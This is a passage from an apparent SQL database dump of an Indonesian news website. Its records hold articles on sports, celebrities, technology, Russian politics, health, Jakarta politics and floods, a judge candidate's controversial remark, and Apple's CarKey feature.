bisnis,&quot; demikian pendapat Karten.</p>\r\n', 'Mark Zuckerberg', 'Minggu', '2018-04-22', '07:52:08', 'facebook-mark-zuckerberg.jpg', 50, 'teknologi', 'Y'),
(610, 21, 'admin', 'Max Biaggi Bantah ke Ducati Musim Depan ', '', '', 'max-biaggi-bantah-ke-ducati-musim-depan-', 'N', 'N', 'Y', 'Roma- Mantan pembalap MotoGP Max Biaggi tengah menikmati kariernya di World Super Bike (WSBK). Terlebih, pencapaiannya di musim ini cukup membuatnya bahagia.<br />\r\n<br />\r\nBiaggi masih memimpin di puncak klasemen WSBK musim ini dengan 272 poin. Hasil ini membuatnya semakin bersemangat untuk menorehkan lagi prestasi juara seperti yang ditorehkannya pada 2010.<br />\r\n<br />\r\nSituasi seperti itu, semakin membuat The Roman Emperor, julukan Biaggi, nyaman membela timnya Aprilia. Makanya, saat disinggung masalah isu kepindahannya ke Ducati musim depan, Biaggi buru-buru membantah. Dia menegaskan ingin mengakhiri kariernya bersama Aprilia.<br />\r\n<br />\r\nSetelah empat tahun melanglang buana di ajang MotoGP dengan prestasi terbaik menjadi runner-up pada musim pertamanya bersama Yamaha, Biaggi memutuskan hengkang pada 2005. Dua tahun berikutnya, pembalap kelahiran Juni 1971 ini terjun ke arena WSBK.<br />\r\n<br />\r\nSebelum berlabuh di Aprilia, Biaggi lebih dulu bergabung dengan Suzuki di tahun pertamanya, dan setahun berikutnya ke Ducati sebelum akhirnya melompat ke Aprilia pada 2009.\r\n', 'Max Biaggi.\r\n', 'Minggu', '2012-08-19', '05:13:20', '', 24, 'olahraga', 'Y'),
(615, 21, 'admin', 'Foto Panas Beredar Lagi, Nikita Mirzani Syok', '', '', 'foto-panas-beredar-lagi-nikita-mirzani-syok', 'N', 'N', 'Y', '<p>Jakarta - Nama Nikita Mirzani memang sedang naik daun belakangan ini. Dengan keberaniannya dalam menampilkan lekuk tubuhnya di beberapa film yang diperaninya, dirinya pun sempat didaulat dengan predikat sebagai salah satu artis hot tanah air.<br />\r\n<br />\r\nNamun, keberaniannya tersebut ternyata harus seiring dengan pil pahit yang ditelannya. Beberapa waktu lalu, foto topless dirinya sempat beredar luas di dunia maya. Dan kini, kembali foto-foto yang memperlihatkan kenekatannya di depan kamera dipertontonkan.<br />\r\n<br />\r\nDalam foto-foto ini, Nikita hanya menutupi payudaranya dengan jari ataupun rambutnya, tanpa mengenakan sehelai baju pun. Saat dikonfirmasi, Nikita mengaku syok.<br />\r\n<br />\r\n&quot;Gue syok. Gak tahu mau ngomong apa lagi. Itu foto emang udah lama banget,&quot; tuturnya, Rabu (15/8).<br />\r\n<br />\r\nArtis yang sempat mengisi program Kakek Kakek Narsis di Trans TV ini belum mau memberikan konfirmasi lebih. Dirinya masih mencari ketenangan atas musibah yang menimpanya untuk ke sekian kali.<br />\r\n<br />\r\n&quot;Gak bisa mikir. Mau ngomong apa. Kasih nafas dulu, kasih gue ketenangan. Ya Tuhan, ada aja musibah menimpa hidup gue. Pokoknya maaf gak bisa ngomong banyak,&quot; tukasnya.</p>\r\n', 'Nikita Mirzani ', 'Minggu', '2018-04-22', '07:59:50', 'nikita-mirzani.jpg', 30, 'selebritis,hiburan', 'Y'),
(613, 36, 'admin', 'Lenovo Yakin Kalahkan Microsoft Surface', '', '', 'lenovo-yakin-kalahkan-microsoft-surface', 'N', 'N', 'N', '<p>Jakarta - Microsoft akan menjual tablet produksi sendiri yang bernama Surface. Beberapa mitra produsen PC kabarnya tak senang dengan kehadiran Surface yang dianggap sebagai pesaing. Namun Lenovo percaya diri tablet buatannya akan mampu mengalahkan Surface.<br />\r\n<br />\r\n&quot;Microsoft memang kuat di software, namun saya tidak percaya mereka bisa menyediakan hardware terbaik di dunia. Sedangkan Lenovo bisa,&quot; klaim CEO Lenovo, Yang Yuanqing.<br />\r\n<br />\r\n&quot;Meskipun kami tidak suka Microsoft membuat hardware, namun meskipun mereka memulai bisnis hardware ini, kami pikir itu hanya berarti satu kompetitor bertambah lagi,&quot; imbuhnya, yang TerasJakarta kutip dari ComputerWorld, Minggu (19/8/2012).<br />\r\n<br />\r\nSebelumnya, kehadiran Microsoft Surface mendapat perlawanan dari Acer. Vendor komputer asal Taiwan itu menyatakan bahwa kedatangan Surface akan berdampak negatif bagi ekosistem industri PC.<br />\r\n<br />\r\nDi masa lalu, Microsoft memang selalu bermitra dengan vendor PC untuk membuat komputer berbasis sistem operasi Windows. Namun untuk Windows 8, mereka memutuskan membuat tablet PC sendiri.<br />\r\n<br />\r\nBahkan, ada kabar yang beredar bahwa Surface akan dijual hanya USD 199. Jika benar, bisa jadi Surface sukses besar mengingat harganya yang sangat terjangkau. Kabarnya, Surface akan dipasarkan sekitar bulan Oktober mendatang, bersamaan dengan perkenalan resmi OS Windows 8.</p>\r\n', '', 'Senin', '2012-08-20', '04:53:44', '', 8, 'teknologi', 'Y'),
(617, 23, 'admin', '\"Expendables 2\" Impian Jean Claude Van Damme', '', 'http://www.youtube.com/embed/7rkdTcQLwZ4', 'expendables-2-impian-jean-claude-van-damme', 'N', 'N', 'N', 'Peran dalam Expendables 2 telah lama diinginkan oleh Jean-Claude Van Damme. Pasalnya aktor laga yang satu ini punya impian untuk bermain bersama Arnold Schwarzenegger, Sylvester Stallone dan Bruce Willis.<br />\r\n<br />\r\nVan Damme yang memerankan si jahat Jean Vilain dalam Expendables 2 mengungkap kepada PostMedia bahwa kesempatan yang didapat untuk bermain bersama kedua aktor idamannya itu sangatlah berharga.<br />\r\n<br />\r\n&quot;Aku selalu berharap untuk bisa membuat film bersama salah satu dari mereka. Kini aku bermain film bersama keduanya,&quot; ungkapnya. Ahli bela diri asal Belgia ini juga mengaku kagum dengan dedikasi Stallone dalam membuat film laga spektakuler ini (Expendables).<br />\r\n<br />\r\n&quot;Aku melihat pria dengan usia lebih dari 60 dan ia masih bisa menikmati apa yang ia lakukan. Aku bahagia kembali, ia (Stallone) membuatku cinta kepada film lagi,&quot; komentarnya.<br />\r\n<br />\r\nSeperti filmnya yang pertama, The Expendables 2 sudah pasti menyajikan baku hantam, adegan tembak-menembak yang intens, serta ledakan di mana-mana. Itulah alasan mengapa The Expendables 2 dibuat, supaya adrenalin penonton terpacu.\r\n', 'Jean-Claude Van Damme.\r\n', 'Senin', '2012-08-20', '05:47:30', '', 27, 'film,hiburan', 'Y'),
(616, 21, 'admin', 'Nyanyikan Anti Putin, Personel Pussy Riot Dibui', '', '', 'nyanyikan-anti-putin-personel-pussy-riot-dibui', 'N', 'N', 'N', '<p>Rusia - Pengadilan Rusia memvonis penjara dua tahun personel band Pussy Riot karena menyanyikan lagu anti Presiden Vladimir Putin.<br />\r\n<br />\r\nPengadilan menetapkan tiga anggota band itu bersalah melakukan &#39;hooliganisme&#39; dengan motivasi agama.<br />\r\n&nbsp;<br />\r\nHakim Marina Syrova mengatakan para anggota band &quot;secara berhati-hati merencanakan&quot; nyanyian mereka tanggal 21 Februari lalu di dalam katedral di Moskow. &quot;Tolokonnikova, Alyokhina dan Samutsevich melakukan &quot;hooliganisme&quot; -- dengan kata lain pelanggaran berat ketertiban umum,&quot; kata Syrova.<br />\r\n<br />\r\n&quot;Pengadilan menyatakan mereka bersalah. Pengadilan meraih putusan berdasarkan kesaksian terdakwa sendiri dan bukti lain,&quot; tambahnya.<br />\r\n<br />\r\nJaksa menuntut hukuman tiga tahun penjara atas tiga anggota band itu.<br />\r\n<br />\r\nPara pendukung band itu melakukan protes di sejumlah tempat di Moskow.&nbsp; Keamanan ketat pun diterapkan dan sejumlah jalan ditutup.<br />\r\n<br />\r\nPussy Riot mengecam kasus tersebut yang mereka katakan diorganisir Putin.<br />\r\n<br />\r\n<strong>Buat Marah Gereja</strong><br />\r\n<br />\r\nSejumah selebriti termasuk bintang pop Amerika, Madonna, menyerukan agar mereka dibebaskan.<br />\r\n<br />\r\nKetiga anggota band itu mengatakan &quot;doa punk&quot; mereka adalah tindak politik untuk memprotes gereja ortodoks Rusia yang mendukung Presiden Putin.<br />\r\n<br />\r\nDalam penampilan seronok mereka di dekat altar mereka meminta Bunda Maria untuk &quot;menggeser Putin&quot;.<br />\r\n<br />\r\nNyanyian mereka membuat marah gereja Ortodoks dan ketua gereka Kirill menyebutkan penampilan itu sama saja dengan penghujatan agama. Namun sejumlah warga Rusia menganggap kasus itu sebagai upaya pemerintah membungkam kritikan.</p>\r\n', 'Pussy Riot', 'Minggu', '2018-04-22', '07:58:55', 'anti_putin.jpg', 23, 'hiburan', 'Y'),
(619, 31, 'admin', '4 Alasan Kenapa Memaafkan Penting Bagi Kesehatan', '', '', '4-alasan-kenapa-memaafkan-penting-bagi-kesehatan', 'N', 'N', 'N', 'Jakarta - Memaafkan bukan berarti melupakan, tapi memberi kesempatan kepada diri sendiri untuk menghapus rasa kesal dan dendam terhadap orang lain. Dengan demikian, rasa marah dan tekanan yang mengganggu emosi pun dapat diredakan. Akibatnya, pikiran jadi lebih tenang dan jauh dari stres. Sejatinya, tak hanya itu saja manfaat kesehatan dari memaafkan orang lain.<br />\r\n<br />\r\nSecara ilmiah, memaafkan kesalahan orang lain dapat bermanfaat baik bagi kesehatan fisik maupun mental. Secara sosial, memaafkan orang lain merupakan wujud kebesaran jiwa dan perilaku yang dianggap baik. Ada banyak manfaat kesehatan dari memaafkan orang lain seperti dilansir Mayo Clinic dan Telegraph, Minggu (19/8/2012) antara lain:<br />\r\n<br />\r\n<strong>1. Terhindar dari Penyakit Tekanan Darah Tinggi</strong><br />\r\nPara peneliti dari University of California, San Diego menemukan bahwa orang-orang yang bisa melepaskan kemarahannya dan memaafkan kesalahan orang lain cenderung lebih rendah risikonya mengalami lonjakan tekanan darah.<br />\r\n<br />\r\nPeneliti meminta lebih dari 200 relawan untuk memikirkan saat temannya menyinggung perasaan. Setengah dari kelompok diperintahkan untuk berpikir mengapa hal tersebut bisa membuatnya marah, sedangkan yang lainnya didorong untuk memaafkan kesalahan tersebut. Peneliti menemukan bahwa orang yang marah mengalami peningkatan tekanan darah lebih besar dibanding orang yang pemaaf.<br />\r\n<strong><br />\r\n2. Terhindar dari Risiko Penyalahgunaan Obat dan Alkohol</strong><br />\r\nSejumlah penelitian telah membuktikan bahwa rasa benci, dendam dan permusuhan dapat memicu tekanan darah tinggi. Stres muncul ketika perasaan kecewa atau tersakiti. Memaafkan adalah sebuah proses perdamaian dengan diri sendiri. Seseorang yang memberi maaf justru akan merasa lebih rileks untuk menerima kondisinya.<br />\r\n<br />\r\nDengan kondisi mental yang lebih rileks, seseorang juga akan terhindar dari risiko penyalahgunaan alkohol dan obat terlarang. Risiko tersebut umumnya dihadapi oleh para pendendam yang membutuhkan jalan pintas untuk lepas dari beban emosi negatifnya.<br />\r\n<br />\r\n<strong>3. Menurunkan Risiko Serangan Jantung</strong><br />\r\nPara ilmuwan membuktikan bahwa permintaan maaf yang ditujukan pada seseorang bisa meningkatkan kesehatan jantungnya. Orang yang mengalami perlakuan kasar akan mengalami peningkatan tekanan darah yang dapat memicu serangan jantung atau stroke. Namun ketika mendengarkan kata &#39;maaf&#39;, tekanan darah akan menurun kembali.<br />\r\n<br />\r\nTekanan darah yang diukur dalam penelitian adalah tekanan darah diastolik, yaitu tekanan dalam darah antara detak jantung atau tekanan dalam arteri-arteri ketika jantung istirahat setelah kontraksi. Jika terlalu tinggi atau terjadi untuk waktu yang lama, dapat meningkatkan kemungkinan stroke atau serangan jantung.<br />\r\n<br />\r\n<strong>4. Jauh dari Stres dan Depresi</strong><br />\r\nSebuah penelitian yang dimuat Personality and Social Psychology Bulletin menemukan bahwa memafkan secara positif dapat mengurangi gejala depresi. Tak hanya itu, memaafkan akan mengembalikan pikiran positif, dan memperbaiki hubungan. Selain itu, memaafkan juga berkaitan dengan perilaku positif lain seperti sifat dermawan, murah hati dan tidak mudah tertekan.<br />\r\n', '', 'Sabtu', '2012-11-17', '08:14:51', '', 29, 'kesehatan', 'Y'),
(625, 41, 'admin', 'Ghazali: Putaran Kedua Pilkada DKI Ketat', '', '', 'ghazali-putaran-kedua-pilkada-dki-ketat', 'N', 'Y', 'N', '<p>Jakata - Pengamat politik dari Universitas Indonesia, Effendi Ghazali, mengungkapkan pada putaran kedua pemilihan kepala daerah (Pilkada) pada September mendatang, akan terjadi persaingan ketat antara pasangan Joko Widodo-Basuki T Purnaka dengan pasangan Fauzi Bowo-Nachrowi Ramli.<br />\r\n<br />\r\n&ldquo;Kami telah mengadakan survey internal, dan hasilnya, akan terjadi persaingan ketat antara Pak Jokowi dan Pak Fauzi Bowo. Tidak seperti hasil sebelumnya yang memang jauh jarak perolehannya,&rdquo; ujarnya ditemui di acara open house yang diadakan Gubernur Fauzi Bowo, di rumah dinasnya Jalan Taman Suropati No. 7, Jakarta Pusat, Minggu (19/08/2012).<br />\r\n<br />\r\nMeski demikian, Effendi urung menyebutkan nilai dari survey yang dilakukan oleh pihaknya, mengingat masih ada margin eror yang besar dari 450 responden yang dilakukan survey. &ldquo;Siapa yang lebih unggul, belum bisa saya kasih tahu sekarang, karena survey kami agak besar margin errornya,&rdquo; jelasnya.<br />\r\n<br />\r\nMenyinggung maraknya penggunaan isu SARA yang terjadi selama bulan ramadhan kemarin, Effendi angkat bicara. Menurutnya, penggunaan isu SARA yang dilakukan oleh pihak-pihak tertentu sudah menimbulkan dampak yang besar, baik di kalangan masyarakat bawah maupun untuk calon pasangan. &ldquo;Itu jelas ada dampaknya. Bahkan pengaruhnya cukup besar untuk pilkada putaran kedua nanti,&rdquo; tandasnya.</p>\r\n', 'Joko Widodo (kiri), Fauzi Bowo (kanan)', 'Minggu', '2018-04-22', '07:41:04', 'efendi_gazali.jpg', 11, 'metropolitan', 'Y'),
(624, 41, 'admin', 'Tuntut THR, Ratusan Pekerja Transjakarta Mogok', '', '', 'tuntut-thr-ratusan-pekerja-transjakarta-mogok', 'N', 'N', 'N', '<p>Jakarta - Ratusan pekerja bus koridor I (Blok M-Kota) dan X (Cililitan-Tanjung Priok) mogok bekerja. pramudi, teknisi, dan petugas keamanan menuntut kenaikan upah dan pembayaran Tunjangan Hari Raya (THR). Mereka di depan Pool Pinang Ranti, Jalan Raya Pondok Gede, Pinang Ranti, Makassar, Jakarta Timur, sambil berorasi membentangkan spanduk bertemakan agar PT Jakarta Expres Trans (JET) membayar THR.<br />\r\n<br />\r\nMenurut&nbsp; pramudi Bus TransJakarta Koridor I, Maya, pihaknya terpaksa melakukan mogok operasi karena pihak perusahaan tidak membayarkan kewajibannya memberikan THR.<br />\r\n<br />\r\n&quot;Sementara, anak-anak sudah menunggu di rumah ingin jalan-jalan ke mal untuk beli baju Lebaran,&quot; ujarnya kepada wartawan, Senin (13/08/2012).<br />\r\n<br />\r\nSedangkan Abdul Chakim berharap, selain memberikan THR perusahaan PT JET juga menaikan upah. Pasalnya, untuk Pramudi yang di bawah manajeman PT JET upahnya bervariasi mulai dari Rp2,4 juta-Rp2,8 juta. Sedangkan pramudi yang berada di bawah manajemen gajinya mencapai Rp5,3 juta.<br />\r\n<br />\r\n&quot;THR kami segera terbayar dan gaji kami dinaikkan sejajar dengan pramudi dari koridor lainnya,&quot; imbuhnya.<br />\r\n<br />\r\nHingga bubar aksi berjalan berdamai, pihak perusahaan berjanji akan membayarka THR dan menaikan upah para pekerja bus Transjakarta.</p>\r\n', '', 'Minggu', '2018-04-22', '07:42:01', 'bus-transjakarta.jpg', 7, 'metropolitan', 'Y'),
(622, 31, 'admin', 'Orang Beriman Kondisi Fisik n Mentalnya Lebih Sehat', '', '', 'orang-beriman-kondisi-fisik-n-mentalnya-lebih-sehat', 'N', 'N', 'N', '<p>Orang yang beriman disayang Tuhan, mungkin itulah sebabnya kemudian orang yang beriman juga memiliki kondisi kesehatan yang baik. Nyatanya, berbagai penelitian menunjukkan bahwa orang-orang yang memiliki keyakinan dan keimanan yang teguh juga memiliki kondisi fisik yang lebih prima.<br /> <br /> \"Keyakinan terhadap agama bisa mengurangi stres, depresi, dan meningkatkan kualitas hidup,\" kata Dr Harold G. Koenig, profesor psikiatri dan ilmu perilaku di Duke University Medical Center seperti dilansir Medpagetoday.com, Minggu (19/8/2012).<br /> <br /> Data sebuah penelitian yang dimuat American Journal of Health Promotion tahun 2005 menyimpulkan bahwa orang yang banyak berdoa lebih banyak mendapat manfaat kesehatan dengan cara menerapkan perilaku yang sehat, menjalankan antisipasi terhadap penyakit dan lebih puas terhadap pelayanan kesehatan.<br /> <br /> Sebuah penelitian tahun 2006 yang dimuat British Medical Journal juga menemukan bahwa kehadiran dalam sebuah acara keagamaan ternyata berkaitan dengan penurunan risiko penyakit menular.<br /> <br /> Menurut Koenig, adanya keyakinan beragama dan kegiatan spiritual berhubungan dengan risiko penyakit atau gangguan kesehatan yang lebih rendah, misalnya stres, penyakit kardiovaskular, tekanan darah, reaktivitas kardiovaskular, gangguan metabolisme serta dapat menjamin keberhasilan operasi jantung. Namun di sisi lain, Koenig juga memperingatkan bahwa cara kerja Tuhan ini tidak dapat diukur dengan cara dan metode apapun.<br /> <br /> \"Saya percaya bahwa doa efektif, tapi tidak berfungsi secara ilmiah dan tidak dapat diprediksi. Tidak ada alasan ilmiah atau teologis atas setiap efek dari keyakinan yang dapat dipelajari atau didokumentasi, seolah-olah Tuhan adalah bagian dari alam semesta yang dapat diprediksi. Ilmu pengetahuan tidak dirancang untuk membuktikan hal-hal yang supranatural,\" kata Koenig.<br /> <br /> Selain itu, keyakinan terhadap agama juga telah dikaitkan dengan umur panjang, perkembangan penyakit kognitif yang lebih lambat dan penuaan yang sehat. Senada dengan Koenig, dr Robert A. Hummer, profesor sosiologi di University of Texas di Austin yang berfokus pada hubungan antara agama dan rendahnya risiko kematian juga memiliki pendapat yang sama.<br /> <br /> Hummer merujuk sebuah penelitian yang melacak beberapa orang berusia 51 - 61 tahun selama 8 tahun untuk mendokumentasikan tingkat ketahanan hidupnya. Penelitian tersebut menemukan bahwa peserta yang tidak menghadiri acara keagamaan sama sekali memiliki kemungkinan 64 persen lebih tinggi mengalami kematian dibandingkan orang yang sering beribadah.</p>', '', 'Senin', '2012-08-20', '08:51:08', '', 31, 'kesehatan', 'Y'),
(644, 41, 'admin', 'Banjir Jakarta banyak Dicari di Google', 'Jakarta Darurat Banjir', '', 'banjir-jakarta-banyak-dicari-di-google', 'N', 'Y', 'N', '<p>Jakarta - Banjir yang mengguyur Jakarta beberapa hari lalu membuat sejumlah lokasi di ibukota banjir. Internet, jadi media yang digunakan warga Jakarta untuk mencari tahu informasi terkini seputar banjir. &nbsp;</p>\r\n\r\n<p>Dalam laporan Pencarian Terhangat Google Indonesia sepanjang 11 - 17 Januari 2013, kata kunci &quot;Banjir di Jakarta&quot; adalah yang paling banyak dimasukkan dalam mesin pencari Google.</p>\r\n\r\n<p>Tak hanya mesin pencari, beberapa platform milik Google juga digunakan untuk memberi informasi seputar banjir. Ada Google Crisis Response, yang menyajikan informasi lokasi-lokasi banjir di Jakarta. Bahkan, layanan ini juga memperlihatkan kondisi lalu lintas yang macet akibat banjir.</p>\r\n\r\n<p>Di dalam Google Crisis Response juga terdapat beberapa nomor telepon penting dari lembaga pemerintah DKI Jakarta maupun swadaya masyarakat, yang dapat dihubungi oleh warga untuk mendapat bantuan dan evakuasi.</p>\r\n\r\n<p>Selain layanan Google, jejaring sosial Twitter juga banyak digunakan untuk mencari informasi terkini. Beberapa akun Twitter yang memberi informasi banjir antara lain @TMCPoldaMetro dan @LewatMana.</p>\r\n\r\n<p>Situs web pemberi informasi lalu lintas LewatMana.com juga laris dikunjungi dalam sepekan ini. LewatMana memperlihatkan kondisi lalu lintas dan gambar dari CCTV. Ia menduduki peringkat 10 Pencarian Terhangat Google Indonesia pada 11 - 17 Januari 2013.</p>\r\n\r\n<p>Dalam sepekan ini, warga juga ingin tahu soal perkiraan cuaca dengan memasukkan kata kunci BMKG di mesin pencari Google. BMKG (Badan Meteorologi Klimatologi dan Geofisika) masuk ke posisi 9 sebagai topik yang paling dicari di Google Indonesia pekan ini. (Sumber: kompas.com)</p>\r\n', '', 'Minggu', '2018-04-22', '07:40:05', 'anis_mengatasi_banjir.jpg', 8, 'nasional', 'Y'),
(645, 47, 'admin', 'Korban dan Pelaku Pemerkosaan parah menderita kelainan', 'Seleksi Calon Hakim Agung', '', 'korban-dan-pelaku-pemerkosaan-parah-menderita-kelainan', 'N', 'N', 'Y', '<p>Calon hakim agung Muhammad Daming Sanusi menyatakan, hukuman mati tidak layak diberlakukan bagi pelaku pemerkosaan. Penjelasannya soal ini mengundang tawa sejumlah anggota Komisi III saat berlangsung fit and proper test hakim agung di Komisi III DPR pada Senin (14/1/2013) ini.</p>\r\n\r\n<p>&quot;Bagaimana menurut Anda, apabila kasus perkosaan ini dibuat menjadi hukuman mati?&quot; tanya anggota Komisi III dari Fraksi PAN, Andi Azhar, ketika itu kepada Daming.</p>\r\n\r\n<p>Daming menjawab, &quot;Yang diperkosa dengan yang memerkosa ini sama-sama menikmati. Jadi, harus pikir-pikir terhadap hukuman mati.&quot;</p>\r\n\r\n<p>Jawaban Daming ini pun langsung mengundang tawa, tetapi tidak sedikit yang mencibir pernyataannya. Dijumpai seusai menjalani fit and proper test, Daming berdalih bahwa pernyataannya itu hanya untuk mencairkan suasana.</p>\r\n\r\n<p>&quot;Kita tadi terlalu tegang, jadi supaya tidak terlalu tegang,&quot; imbuhnya.</p>\r\n\r\n<p>Menurut Daming, hukuman mati harus dipertimbangkan baik-baik. Ia beralasan, dirinya belum memberikan jawaban tegas apakah ia mendukung atau tidak penerapan hukuman mati bagi pelaku pemerkosaan. &quot;Tentu kita harus pertimbangkan baik-baik kasus tertentu, seperti narkoba, korupsi, saya setuju. Tapi untuk kasus pemerkosan, harus dipertimbangkan dulu. Tadi saya belum memberikan jawaban yang tegas,&quot; kata Daming.</p>\r\n\r\n<p>Menanggapi pernyataan itu, anggota Komisi III lain dari Fraksi Partai Demokrat, Himmatul Aliya Setiawati, menilai candaan Daming sangat tidak pantas.</p>\r\n\r\n<p>&quot;Saya kira candaannya tidak pas. Saya setuju ada hukuman mati ya,&quot; ucap Aliya.</p>\r\n\r\n<p>Meski menganggap tak pantas, ia menilai jawaban Daming sudah memenuhi kriteria yang diharapkan dari seorang hakim agung. &quot;Dari Fraksi Gerindra menyatakan tidak akan memilih, tapi kalau saya sih soal memilih kita lihat nilai-nilai keseluruhannya,&quot; tutur Aliya. (Sumber: kompas.com</p>\r\n', '', 'Minggu', '2018-06-03', '15:37:13', 'perkosaan.jpg', 18, 'hukum', 'Y'),
(602, 41, 'admin', 'La Nyalla Kembalikan Riedl Jadi Pelatih Timnas', '', '', 'la-nyalla-kembalikan-riedl-jadi-pelatih-timnas', 'Y', 'N', 'N', '<p>Jakarta - Jakarta - Setelah membentuk Timnas, PSSI versi KLB pimpinan La Nyalla Mahmud Matalitti menunjuk Alfred Riedl sebagai pelatihnya.<br />\r\n<br />\r\nPria asal Austria itu sebelumnya pernah menukangi Timnas, namun dipecat pada 13 Juli 2011 akibat kisruh ditubuh PSSI. Dengan penunjukan itu, berarti Riedl akan kembali jadi peramu permainan skuad &#39;Pasukan Garuda&#39; jelang Piala AFF di Malaysia, November mendatang.<br />\r\n<br />\r\nMenurut Acting Sekjen PSSI Tigor Shalom Boboy,&nbsp; Riedl ditunjuk oleh Direktur Teknik Timnas Benny Dollo yang sebelumnya diberi mandat oleh PSSI&nbsp; Rabu (8/8/2012) lalu.<br />\r\n<br />\r\n&quot;Benny Dollo telah memberikan rekomendasinya terkait posisi pelatih kepala tim nasional senior kepada Exco PSSI melalui Ketua Umum La Nyalla Mahmud Mattalitti. Posisi pelatih kepala tim nasional senior yg direkomendasikan oleh Benny Dollo selaku Direktur Teknik adalah Alfred Riedl,&quot; ujar Tigor melalui rilis yang diterima INILAH.COM, Kamis (16/8/2012).<br />\r\n<br />\r\nTigor mengungkapkan bahwa Riedl sudah menyatakan kesediaannya terhadap penunjukannya sebagai pelatih kepala tim nasional senior. Pria 62 tahun itu akan&nbsp; tiba di Indonesia pada akhir Agustus 2012.<br />\r\n<br />\r\nSetelah itu, Riedl akan langsung menyusun nama-nama siapa saja yang akan masuk dalam tim besutannya.<br />\r\n<br />\r\n&quot;Susunan Managemen dan Official serta pemain Tim Nasional akan diumumkan pasca lebaran menunggu konfirmasi pelatih kepala Alfred Riedl,&quot; tukas Tigor.<br />\r\n<br />\r\nSebelumnya, pihak PSSI KLB pimpinan La Nyalla menyatakan membentuk Timnas sendiri setelah mandegnya pertemuan Joint Committee PSSI. Menurut pihak La Nyalla, seharusnya pembentukan Timnas dibahas di komite bersama tersebut melibatkan dua belah pihak, antara kubu Djohar Arifin dengan pihaknya.<br />\r\n<br />\r\nPiala AFF akan diselenggarakan 22 November hingga 22 Desember 2012 dengan tuan rumah Malaysia dan Thailand. Indonesia akan bermain di Grup B yang bertempat di Malaysia bersama Malaysia, Singapura dan Runner Up babak penyisihan.</p>\r\n', '', 'Minggu', '2018-04-22', '07:44:01', 'la_nyalla.JPG', 5, 'bola,olahraga', 'Y'),
(603, 19, 'admin', 'iPhone Bisa Jadi Kunci Mobil, Bagaimana Jika Baterainya Habis?', '', 'https://www.youtube.com/watch?v=oDiPvLzzNm4', 'iphone-bisa-jadi-kunci-mobil-bagaimana-jika-baterainya-habis', 'Y', 'Y', 'N', '<p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">MSTORE.co.id - Salah satu fitur terbaru yang diperkenalkan bersama iOS 14 dalam ajang WWDC 2020 adalah CarKey yang bisa menyulap iPhone menjadi kunci mobil, untuk membuka pintu dan menyalakan mesin. </span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">CarKey bekerja dengan memanfaatkan teknologi NFC yang tertanam di iPhone dan beberapa mobil keluaran terbaru. Pengguna pun cukup mendekatkan iPhone ke bagian NFC yang biasanya terletak di handle untuk membuka pintu secara nirkabel. </span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">Bagaimana kalau baterai iPhone habis? Apple rupanya menyadari adanya kekhawatiran ini dan mengatakan bahwa CarKey di iPhone akan tetap bisa digunakan walaupun perangkat kehabisan baterai sehingga tidak bisa menyala. </span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">Ini karena ada fitur porsi daya cadangan yang disediakan khusus untuk tetap memfungsikan CarKey. Tapi daya tahannya tidak lama, hanya lima saja sehingga pengguna perlu bergegas kembali ke kendaraan apabila iPhone kehabisan baterai.</span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">Meski demikian, sebagaimana dihimpun KompasTekno dari SlashGear, Rabu (23/6/2020),&nbsp;CarKey tidak bisa digunakan apabila iPhone sengaja dimatikan oleh pengguna. </span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">Secara default, CarKey bisa langsung dipakai tanpa harus melakukan unlock iPhone. Namun, pengguna bisa mengatur agar ponsel meminta otentikasi dulu seperti melalui Face ID, Touch ID, atau passcode.</span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">CarKey&nbsp;juga bisa membantu pengguna yang ingin meminjamkan kendaraan ke orang lain tanpa perlu memberikan kunci fisik. Sebuah \"kunci digital\"&nbsp;CarKey bisa dibagikan ke lima orang kontak lewat iMessage. Tentu, penerimanya harus memiliki iPhone pula. </span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">Kunci digital yang dikirimkan bisa disertai dengan pengaturan fungsi-fungsi mobil untuk orang yang akan dipinjamkan, misalnya membatasi kecepatan maksimal supaya tidak dipakai ngebut.&nbsp; </span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">Total daya mesin yang tersedia dan volume suara maksimal juga bisa diatur. Kemudian, pemilik kendaraan bisa mencabut akses Digital Key sewaktu-waktu apabila dirasa perlu. </span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">Selain digunakan secara langsung lewat iPhone,&nbsp;CarKey juga dapat dipakai lewat arloji pintar Apple Watch yang terhubung ke ponsel. </span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">Adapun model-model iPhone yang mendukung&nbsp;CarKey di iOS hanya yang teranyar saja, yakni iPhone XR, iPhone XS, iPhone XS Max, iPhone 11, iPhone 11 Pro, iPhone 11 Pro Max, dan iPhone SE (2nd generation), serta Apple Watch Series 5.</span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">Untuk penerapan awalnya,&nbsp;CarKey akan bisa digunakan di mobil sedan BMW Seri 5 2021.Kunci digital ini nantinya juga akan tersedia untuk mobil-mobil BMW yang dirilis setelah 1 Juli 2020 seperti seri 1, 2, 3, 4, 5, 6, 8, X5, X6, X7, X5M, X6M, dan Z4. </span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">CarKey sendiri rencananya akan mulai dihadirkan di update iOS 13.6 Jadi, pengguna tak perlu menunggu kehadiran iOS 14 menjelang akhir tahun nanti.</span><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\"><br></span><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\"><br></span><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\"><br></span><br></p>', 'iPhone Bisa Jadi Kunci Mobil, Bagaimana Jika Baterainya Habis? Simak Artikel-nya yaa!', 'Sabtu', '2020-07-07', '14:27:34', 